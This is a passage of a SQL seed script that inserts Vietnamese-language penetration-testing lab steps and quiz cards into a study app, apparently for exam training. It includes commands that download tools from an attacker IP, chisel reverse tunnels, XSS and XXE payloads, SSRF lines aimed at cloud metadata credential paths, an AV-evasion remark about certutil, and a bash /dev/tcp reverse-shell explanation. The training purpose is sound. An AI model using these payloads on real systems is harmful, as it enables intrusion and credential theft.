"name,pathname,startmode là 3 field cần lấy để phát hiện unquoted service path — pathname chứa đường dẫn binary cần kiểm tra dấu ngoặc kép."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 11 — Windows Privilege Escalation cơ bản';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Dùng wget (thay cho curl) để tải linpeas.sh từ attacker (10.10.14.5:8000) trên máy victim Linux.", "hint": "wget http://10.10.14.5:8000/linpeas.sh", "patterns": ["wget\\s+http://10\\.10\\.14\\.5:8000/linpeas\\.sh"], "explanation": "wget là lựa chọn thay thế curl -O khi victim không có curl — cú pháp wget <url> tự lưu file với tên gốc trong URL."}, {"prompt": "Trên máy attacker, mở HTTP server ở cổng 9999 (khác cổng 8000 đã luyện).", "hint": "python3 -m http.server 9999", "patterns": ["python3?\\s+-m\\s+http\\.server\\s+9999"], "explanation": "Số cổng ở cuối lệnh http.server có thể đổi tùy ý, chỉ cần victim tải đúng URL khớp với cổng đã mở."}, {"prompt": "Chạy chisel ở chế độ SERVER (phía attacker) để chờ client reverse connect, cổng 8080.", "hint": "chisel server -p 8080 --reverse", "patterns": ["chisel\\s+server\\s+-p\\s*8080\\s+--reverse"], "explanation": "chisel server --reverse phải chạy TRƯỚC ở attacker để chờ máy pivot (chisel client ...) kết nối tới — ngược thứ tự với việc attacker tự kết nối ra."}, {"prompt": "Hoàn thiện lệnh chisel client để tạo SOCKS proxy ngược về attacker, điền đúng cờ R: chisel client 10.10.14.5:8080 ____", "hint": "chisel client 10.10.14.5:8080 R:socks", "patterns": ["chisel\\s+client\\s+10\\.10\\.14\\.5:8080\\s+R:socks"], "explanation": "R:socks yêu cầu chisel mở một SOCKS proxy ở phía server (attacker), đường hầm qua kết nối reverse từ client (máy pivot)."}, {"prompt": "Hoàn thiện lệnh proxychains để quét cổng 445 qua SOCKS proxy, điền đúng loại scan nmap tương thích với proxy: proxychains nmap -____ -p 445 10.10.30.50", "hint": "proxychains nmap -sT -p 445 10.10.30.50", "patterns": ["proxychains\\s+nmap\\s+-sT\\s+-p\\s*445\\s+10\\.10\\.30\\.50"], "explanation": "-sT (TCP connect scan) là loại scan duy nhất hoạt động qua SOCKS proxy vì nó dùng connect() syscall thông thường, không cần raw packet như -sS."}, {"prompt": "Hoàn thiện lệnh certutil để tải nc.exe về máy Windows victim, điền đúng tên file lưu ra ở cuối: certutil -urlcache -split -f http://10.10.14.5:8000/nc.exe ____", "hint": "certutil -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe", "patterns": ["certutil\\s+-urlcache\\s+-split\\s+-f\\s+http://10\\.10\\.14\\.5:8000/nc\\.exe\\s+nc\\.exe"], "explanation": "certutil cần CẢ URL nguồn VÀ tên file đích ở cuối câu lệnh — khác wget/curl -O tự đặt tên theo URL, certutil phải chỉ định rõ."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 12 — File transfer & pivoting/tunneling';

UPDATE cards SET payload = jsonb_set(payload, '{steps}', (payload->'steps') || '[{"prompt": "Thẻ <img onerror=...> cũng bị lọc. Thử event handler onload trên thẻ <svg> để bypass filter khác.", "hint": "<svg onload=alert(1)>", "patterns": ["<svg\\s+onload=alert\\(1\\)>"], "explanation": "<svg onload=...> là một bypass XSS kinh điển khác, tận dụng event onload của SVG mà nhiều filter chỉ tập trung chặn <script> và onerror cũng bỏ sót."}, {"prompt": "Thử SSRF vào metadata endpoint của Google Cloud (khác AWS đã luyện) để kiểm tra server có chạy trên GCP hay không.", "hint": "http://169.254.169.254/computeMetadata/v1/", "patterns": ["169\\.254\\.169\\.254/computeMetadata/v1"], "explanation": "GCP cũng dùng cùng IP metadata 169.254.169.254 như AWS, nhưng path khác (computeMetadata/v1 thay vì latest/meta-data) và yêu cầu header Metadata-Flavor: Google."}, {"prompt": "Thay vì đọc /etc/passwd, dùng XXE để thực hiện SSRF: định nghĩa external entity trỏ tới metadata endpoint AWS.", "hint": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>", "patterns": ["<!ENTITY\\s+xxe\\s+SYSTEM\\s+.?http://169\\.254\\.169\\.254/latest/meta-data"], "explanation": "SYSTEM trong XXE không chỉ nhận file:// — có thể nhận bất kỳ URI scheme được parser hỗ trợ, bao gồm http://, biến XXE thành một dạng SSRF."}, {"prompt": "Hoàn thiện payload XSS bypass filter <script>, dùng thẻ <img> với event handler nào: <img src=x ____=alert(1)>", "hint": "<img src=x onerror=alert(1)>", "patterns": ["<img\\s+src=x\\s+onerror=alert\\(1\\)>"], "explanation": "onerror là event handler kích hoạt khi ảnh (src=x, không tồn tại) load lỗi — nhiều filter chỉ chặn từ khóa ''script'' nên bỏ sót event handler này."}, {"prompt": "Hoàn thiện địa chỉ metadata service nội bộ của AWS EC2 dùng để khai thác SSRF: http://____/latest/meta-data/iam/security-credentials/", "hint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "patterns": ["169\\.254\\.169\\.254/latest/meta-data/iam/security-credentials"], "explanation": "169.254.169.254 là địa chỉ link-local cố định mà AWS EC2 dùng cho metadata service nội bộ, không cần cấu hình gì thêm."}, {"prompt": "Hoàn thiện payload XXE, điền đúng tên khai báo thực thể ngoài: <!DOCTYPE foo [<!____ xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "hint": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "patterns": ["<!ENTITY\\s+xxe\\s+SYSTEM\\s+.?file:///etc/passwd"], "explanation": "ENTITY là từ khóa XML DTD để định nghĩa một thực thể; kết hợp với SYSTEM để trỏ tới một nguồn ngoài (file hoặc URL)."}]'::jsonb, true)
WHERE kind = 'lab' AND front = 'Lab 13 — Web: XSS, SSRF, XXE cơ bản';


INSERT INTO cards (deck_id, kind, front, payload, source)
SELECT d.id, 'mcq', q.front, q.payload::jsonb, 'seed'
FROM (VALUES
  ('[Lab 1 — Linux] Trong lệnh `ls -la`, cờ nào khiến ls hiển thị cả các file ẩn (tên bắt đầu bằng dấu chấm)?', '{"choices": ["-a", "-l", "-h", "-R"], "answer": 0, "explanation": "-a (all) hiển thị cả file ẩn; -l chỉ quyết định định dạng hiển thị chi tiết, không liên quan tới việc ẩn/hiện file."}'),
  ('[Lab 1 — Linux] Để tìm file trên toàn hệ thống mà KHÔNG phân biệt chữ hoa/thường trong tên, dùng cờ nào của `find` thay cho `-name`?', '{"choices": ["-iname", "-type f", "-path", "-perm"], "answer": 0, "explanation": "-iname là bản không phân biệt hoa/thường của -name; -type, -path, -perm dùng cho mục đích khác (loại file, đường dẫn, quyền)."}'),
  ('[Lab 1 — Linux] Cờ nào của `grep` khiến việc tìm kiếm KHÔNG phân biệt chữ hoa/thường?', '{"choices": ["-i", "-r", "-v", "-c"], "answer": 0, "explanation": "-i (ignore case); -r là đệ quy vào thư mục con, -v đảo ngược kết quả (in dòng KHÔNG khớp), -c chỉ đếm số dòng khớp."}'),
  ('[Lab 2 — Nmap] Cờ nào của nmap dùng để quét TOÀN BỘ 65535 cổng TCP thay vì chỉ top 1000 mặc định?', '{"choices": ["-p-", "-sn", "-sU", "-A"], "answer": 0, "explanation": "-p- (tương đương -p 1-65535) quét hết dải cổng TCP; -sn chỉ ping sweep, -sU là quét UDP, -A là bật nhiều tính năng (OS detect, version, script, traceroute) nhưng không tự mở rộng dải cổng."}'),
  ('[Lab 2 — Nmap] Trong lệnh `nmap -sC -sV -p 22,80 10.10.10.5`, cờ `-p` nhận giá trị gì ngay sau nó?', '{"choices": ["Danh sách cổng cần quét (ví dụ 22,80)", "Địa chỉ IP mục tiêu", "Đường dẫn file wordlist", "Tên file output"], "answer": 0, "explanation": "-p <cổng> luôn đứng ngay trước danh sách/dải cổng; IP mục tiêu luôn ở cuối câu lệnh, không ngay sau -p."}'),
  ('[Lab 2 — Nmap] Để xuất kết quả quét ra cả 3 định dạng (normal, XML, grepable) CÙNG LÚC, dùng cờ nào?', '{"choices": ["-oA", "-oN", "-oX", "-oG"], "answer": 0, "explanation": "-oA (All) xuất đồng thời cả 3; -oN/-oX/-oG chỉ xuất riêng từng định dạng normal/XML/grepable tương ứng."}'),
  ('[Lab 3 — Web enum] Trong ffuf, từ khóa đặc biệt nào trong URL được thay thế bằng từng dòng của wordlist?', '{"choices": ["FUZZ", "WORD", "TARGET", "INPUT"], "answer": 0, "explanation": "FUZZ là placeholder riêng của ffuf; gobuster không cần từ khóa này vì tự thêm wordlist vào cuối path theo -u."}'),
  ('[Lab 3 — Web enum] Cờ nào của gobuster (mode dir) dùng để chỉ định wordlist?', '{"choices": ["-w", "-u", "-x", "-t"], "answer": 0, "explanation": "-w là wordlist; -u là URL target, -x là danh sách extension, -t là số thread."}'),
  ('[Lab 3 — Web enum] Cờ nào của curl dùng để chỉ lấy HTTP header (gửi HEAD request) mà không lấy body?', '{"choices": ["-I", "-X", "-d", "-o"], "answer": 0, "explanation": "-I (--head) gửi HEAD request; -X đổi method HTTP method khác, -d gửi data (POST body), -o lưu output ra file."}'),
  ('[Lab 4 — SQLi] Trong lệnh sqlmap, cờ nào dùng để chỉ định DATABASE cụ thể cần làm việc?', '{"choices": ["-D", "-T", "-C", "-u"], "answer": 0, "explanation": "-D chọn database; -T chọn table, -C chọn column, -u chỉ định URL target."}'),
  ('[Lab 4 — SQLi] Trong lệnh `sqlmap -u URL ____ app --tables`, cờ nào điền vào chỗ trống, đứng NGAY TRƯỚC tên database?', '{"choices": ["-D", "-T", "-C", "--dbs"], "answer": 0, "explanation": "-D app --tables nghĩa là chọn database ''app'' rồi liệt kê bảng trong đó; -T dùng để chọn table (cần -D trước), --dbs không nhận tên database theo sau."}'),
  ('[Lab 4 — SQLi] Trong payload `'' OR ''1''=''1''--`, ký tự `--` có vai trò gì?', '{"choices": ["Comment phần còn lại của câu lệnh SQL phía sau", "Nối hai câu lệnh SQL lại với nhau", "Escape dấu nháy đơn", "Chỉ định kiểu dữ liệu"], "answer": 0, "explanation": "-- là comment trong SQL (cần theo sau ít nhất 1 khoảng trắng ở nhiều DBMS) — mọi thứ sau nó trong câu lệnh bị bỏ qua, vô hiệu hóa phần kiểm tra password gốc."}'),
  ('[Lab 5 — LFI/CMDi] Trong path traversal, chuỗi nào dùng để thoát ra MỘT cấp thư mục cha?', '{"choices": ["../", "./", "..\\\\", "//"], "answer": 0, "explanation": "../ (dot-dot-slash) là cú pháp chuẩn trên Unix để lên một cấp thư mục; ./ chỉ thư mục hiện tại, không di chuyển lên."}'),
  ('[Lab 5 — LFI/CMDi] Wrapper nào của PHP cho phép đọc source code dưới dạng base64 thay vì bị thực thi?', '{"choices": ["php://filter", "php://input", "php://memory", "php://stdin"], "answer": 0, "explanation": "php://filter kết hợp convert.base64-encode trả nội dung file dạng base64; php://input/memory/stdin dùng cho mục đích khác (đọc request body, buffer tạm, stdin)."}'),
  ('[Lab 5 — LFI/CMDi] Ký tự nào trong shell cho phép chạy lệnh thứ hai CHỈ KHI lệnh đầu THÀNH CÔNG (exit code 0)?', '{"choices": ["&&", ";", "|", "||"], "answer": 0, "explanation": "&& là AND có điều kiện; ; luôn chạy lệnh sau bất kể kết quả lệnh trước, | chuyển output thành input, || chỉ chạy lệnh sau khi lệnh trước THẤT BẠI."}'),
  ('[Lab 6 — Shell/TTY] Trong `bash -i >& /dev/tcp/IP/PORT 0>&1`, phần `0>&1` có vai trò gì?', '{"choices": ["Redirect stdin (fd 0) về cùng chỗ với stdout (fd 1), tức là về kết nối TCP", "Đóng toàn bộ output", "Chỉ định port nguồn", "Bật chế độ verbose"], "answer": 0, "explanation": "0>&1 khiến file descriptor 0 (stdin) trỏ tới cùng đích với fd 1 (stdout) — vốn đã được >& trỏ vào /dev/tcp/..., nên cả 3 luồng stdin/stdout/stderr đều đi qua kết nối TCP."}'),
  ('[Lab 6 — Shell/TTY] Để tạo pseudo-terminal (pty) đầy đủ bằng Python, dùng module nào?', '{"choices": ["pty", "tty", "os", "subprocess"], "answer": 0, "explanation": "Module pty (với hàm pty.spawn) tạo pseudo-terminal thật; tty/os/subprocess không cung cấp trực tiếp chức năng này."}'),
  ('[Lab 6 — Shell/TTY] Cờ nào của netcat dùng để KHÔNG resolve DNS (giữ nguyên địa chỉ IP, không tra tên host)?', '{"choices": ["-n", "-v", "-l", "-p"], "answer": 0, "explanation": "-n bỏ qua DNS lookup (nhanh hơn, tránh lộ traffic DNS); -v là verbose, -l là listen mode, -p chỉ định cổng."}'),
  ('[Lab 7 — Privesc] Giá trị octal nào đại diện cho SUID bit khi dùng với `find -perm`?', '{"choices": ["4000", "2000", "1000", "0777"], "answer": 0, "explanation": "4000 là SUID; 2000 là SGID, 1000 là sticky bit, 0777 là quyền rwx đầy đủ cho mọi người, không liên quan tới SUID/SGID."}'),
  ('[Lab 7 — Privesc] Cờ nào của `/bin/sh` giữ nguyên quyền EFFECTIVE (effective UID/GID) khi spawn từ một binary có SUID?', '{"choices": ["-p", "-i", "-l", "-x"], "answer": 0, "explanation": "-p (privileged) là cờ GTFOBins luôn khuyến nghị dùng cho /bin/sh hoặc /bin/bash khi khai thác SUID, để không tự hạ quyền xuống real UID."}'),
  ('[Lab 7 — Privesc] Lệnh nào dùng để xem danh sách các lệnh user hiện tại được phép chạy với sudo?', '{"choices": ["sudo -l", "sudo -i", "sudo -s", "sudo -v"], "answer": 0, "explanation": "sudo -l (list); sudo -i mở shell login mới với quyền root, sudo -s mở shell với quyền root giữ nguyên env, sudo -v chỉ refresh timestamp xác thực."}'),
  ('[Lab 8 — AD] Cờ nào của smbclient/rpcclient dùng để kết nối KHÔNG CẦN MẬT KHẨU (null session)?', '{"choices": ["-N", "-U", "-L", "-I"], "answer": 0, "explanation": "-N (no password); -U nhận username, -L chỉ liệt kê share (không liên quan xác thực), -I chỉ định IP server."}'),
  ('[Lab 8 — AD] Trong ldapsearch, cờ nào dùng để chỉ định BASE DN cho truy vấn?', '{"choices": ["-b", "-H", "-x", "-D"], "answer": 0, "explanation": "-b (base) chỉ định base DN; -H chỉ định LDAP URI server, -x là simple bind, -D chỉ định bind DN (dùng khi auth bằng tài khoản, không ẩn danh)."}'),
  ('[Lab 8 — AD] Trong bloodhound-python, cờ -c nhận giá trị gì để thu thập MỌI loại dữ liệu (user, group, session, ACL, trust)?', '{"choices": ["all", "full", "*", "everything"], "answer": 0, "explanation": "Giá trị hợp lệ đặc biệt là ''all'' (viết thường); các chuỗi khác không được bloodhound-python nhận diện cho mục đích này."}'),
  ('[Lab 9 — Password attacks] Trong hydra, cờ nào dùng để chỉ định MỘT username cố định (khác với -L dùng cho danh sách username)?', '{"choices": ["-l", "-L", "-P", "-p"], "answer": 0, "explanation": "-l (thường) = 1 username cố định; -L (hoa) = file danh sách username; -P (hoa) = file danh sách password; -p (thường) = 1 password cố định."}'),
  ('[Lab 9 — Password attacks] Trong hashcat, mode số nào (giá trị cho -m) dùng cho hash MD5?', '{"choices": ["0", "1000", "1400", "1800"], "answer": 0, "explanation": "Mode 0 là MD5; 1000 là NTLM, 1400 là SHA256, 1800 là sha512crypt — mỗi mode ứng với một thuật toán hash riêng."}'),
  ('[Lab 9 — Password attacks] Lệnh nào của John the Ripper dùng để xem lại các mật khẩu ĐÃ CRACK được, không chạy crack lại?', '{"choices": ["john --show", "john --list", "john --status", "john --restore"], "answer": 0, "explanation": "--show in lại kết quả đã có trong file .pot; --list hiển thị thông tin cấu hình (format, rule...), --status/--restore liên quan tới theo dõi/tiếp tục một phiên crack đang chạy."}'),
  ('[Lab 10 — tmux] Phím tắt nào (sau khi gõ prefix C-b) dùng để tạo một window MỚI trong tmux?', '{"choices": ["c", "n", "p", "x"], "answer": 0, "explanation": "c = create window; n/p chuyển window kế tiếp/trước, x đóng (kill) pane/window hiện tại."}'),
  ('[Lab 10 — tmux] Phím tắt nào dùng để DETACH khỏi session tmux mà vẫn giữ session chạy nền?', '{"choices": ["d", "x", "q", "e"], "answer": 0, "explanation": "d = detach, không kill tiến trình đang chạy trong session; x hỏi xác nhận rồi kill pane/window, chấm dứt tiến trình bên trong."}'),
  ('[Lab 10 — tmux] Lệnh terminal nào (gõ trực tiếp, không qua prefix) dùng để gắn lại vào session tmux gần nhất?', '{"choices": ["tmux attach", "tmux new", "tmux kill-session", "tmux list"], "answer": 0, "explanation": "tmux attach (hoặc tmux a) gắn lại session đã detach; tmux new tạo session mới, tmux kill-session xoá session, tmux list không phải cú pháp hợp lệ (đúng là tmux ls)."}'),
  ('[Lab 11 — Windows Privesc] Lệnh nào liệt kê các PRIVILEGE hiện tại của user trên Windows (ví dụ để tìm SeImpersonatePrivilege)?', '{"choices": ["whoami /priv", "whoami /groups", "whoami /user", "net user"], "answer": 0, "explanation": "/priv liệt kê privilege; /groups liệt kê group membership, /user liệt kê thông tin user hiện tại, net user quản lý tài khoản (không liệt kê privilege đang có)."}'),
  ('[Lab 11 — Windows Privesc] Cờ nào của PrintSpoofer dùng để chỉ định LỆNH cần chạy với quyền SYSTEM?', '{"choices": ["-c", "-i", "-l", "-p"], "answer": 0, "explanation": "-c (command) chỉ định lệnh cần chạy; -i giữ chế độ tương tác, PrintSpoofer không có cờ -l hoặc -p theo cú pháp chuẩn."}'),
  ('[Lab 11 — Windows Privesc] Lỗ hổng ''unquoted service path'' xảy ra khi đường dẫn binary của service KHÔNG có ký tự nào?', '{"choices": ["Dấu ngoặc kép", "Dấu gạch chéo ngược", "Khoảng trắng", "Ký tự :"], "answer": 0, "explanation": "Nếu path chứa khoảng trắng (vd C:\\Program Files\\App\\svc.exe) nhưng KHÔNG được bao trong dấu ngoặc kép, Windows sẽ thử chạy từng phần cắt tại mỗi khoảng trắng (C:\\Program.exe trước) — tạo file đó ở vị trí ghi được là chiếm quyền service."}'),
  ('[Lab 12 — Pivoting] Vì sao phải dùng -sT (TCP connect scan) thay vì -sS khi quét qua proxychains/SOCKS proxy?', '{"choices": ["SOCKS proxy không hỗ trợ raw packet cần cho SYN scan", "-sT luôn nhanh hơn -sS trong mọi trường hợp", "-sS đã bị loại bỏ khỏi nmap", "Không có sự khác biệt nào"], "answer": 0, "explanation": "-sS (SYN scan) cần quyền tạo raw packet trực tiếp, điều mà SOCKS proxy không hỗ trợ; -sT dùng connect() syscall bình thường của hệ điều hành nên hoạt động được qua proxy."}'),
  ('[Lab 12 — Pivoting] Cờ nào của chisel client dùng để mở một SOCKS proxy NGƯỢC VỀ phía attacker (server)?', '{"choices": ["R:socks", "L:socks", "-reverse", "--socks"], "answer": 0, "explanation": "R: (remote) nghĩa là mở listener ở phía SERVER (attacker); L: (local) mới là mở listener ở phía client — R:socks là cú pháp chính xác để tạo SOCKS proxy ngược."}'),
  ('[Lab 12 — Pivoting] certutil trên Windows thường được dùng để tải file vì lý do nào?', '{"choices": ["Là LOLBin có sẵn, ít bị AV chặn hơn so với PowerShell IEX", "Chỉ certutil mới hỗ trợ giao thức HTTP", "certutil nhanh hơn mọi công cụ khác", "certutil là công cụ của bên thứ ba cần cài thêm"], "answer": 0, "explanation": "certutil là binary hợp pháp có sẵn trên mọi Windows (LOLBin), nên nhiều AV/EDR ít chú ý hơn so với lệnh PowerShell Invoke-WebRequest/IEX hay chạy script tải file."}'),
  ('[Lab 13 — XSS/SSRF/XXE] Payload `<img src=x onerror=alert(1)>` khai thác điều gì để bypass filter chặn từ khóa ''script''?', '{"choices": ["Dùng event handler HTML khác (onerror) mà filter quên chặn", "Dùng mã hoá base64 cho toàn bộ payload", "Không liên quan gì tới XSS", "Chỉ hoạt động trên trình duyệt IE cũ"], "answer": 0, "explanation": "Nhiều bộ lọc chỉ kiểm tra/chặn từ khóa ''script'' mà quên các event handler HTML khác như onerror, onload, onmouseover — đây là cách bypass rất phổ biến."}'),
  ('[Lab 13 — XSS/SSRF/XXE] Địa chỉ IP nào là metadata service nội bộ của AWS EC2, thường bị khai thác qua SSRF?', '{"choices": ["169.254.169.254", "127.0.0.1", "10.0.0.1", "0.0.0.0"], "answer": 0, "explanation": "169.254.169.254 là địa chỉ link-local cố định AWS dùng cho metadata service; 127.0.0.1 là localhost thông thường, không liên quan tới cloud metadata."}'),
  ('[Lab 13 — XSS/SSRF/XXE] Trong payload XXE, từ khóa nào dùng để định nghĩa một EXTERNAL ENTITY trỏ tới file hoặc URL ngoài?', '{"choices": ["SYSTEM", "PUBLIC", "EXTERNAL", "INCLUDE"], "answer": 0, "explanation": "SYSTEM đứng sau <!ENTITY tên ...> để chỉ định nguồn ngoài (file:// hoặc http://); PUBLIC dùng cho DTD công khai có định danh, không phải cú pháp dùng trong khai thác XXE kinh điển."}')
) AS q(front, payload)
JOIN decks d ON d.slug = 'practice'
  AND d.subject_id = (SELECT id FROM subjects WHERE slug = 'pentest')
ON CONFLICT DO NOTHING;